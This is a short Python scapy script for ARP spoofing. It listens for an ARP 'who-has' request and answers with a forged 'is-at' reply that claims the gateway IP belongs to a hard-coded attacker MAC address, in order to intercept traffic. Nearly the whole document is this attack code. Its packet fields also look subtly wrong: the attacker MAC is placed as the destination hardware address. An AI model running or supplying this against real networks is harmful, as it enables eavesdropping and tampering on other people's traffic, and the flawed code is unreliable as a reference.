#!/usr/bin/python

from scapy.all import *

gateway="140.233.103.1"
attackers_MAC="2c:33:58:80:7a:c3"

#snarf all traffic looking for ARP who-is broadcasts
#take the dst ip and use it in my ARP is-at response. it *should* respond quicker than the intended device
intended_ip = ""
def get_ip(pkt):
    if pkt[ARP].op == 1:
        global intended_ip
        intended_ip = pkt[ARP].pdst
        response = srp1(ARP(op="is-at", psrc=gateway, pdst=intended_ip, hwdst=attackers_MAC))
        print("intended_ip: ", intended_ip)
        print(response)

capture = sniff(prn=get_ip, filter="arp", count=1)

print("done")
#2c:33:58:80:7a:c3response = srp1(Ether(dst=attackers_MAC)/ARP(op="is-at", psrc=gateway, pdst=intended_ip, hwdst=attackers_MAC))

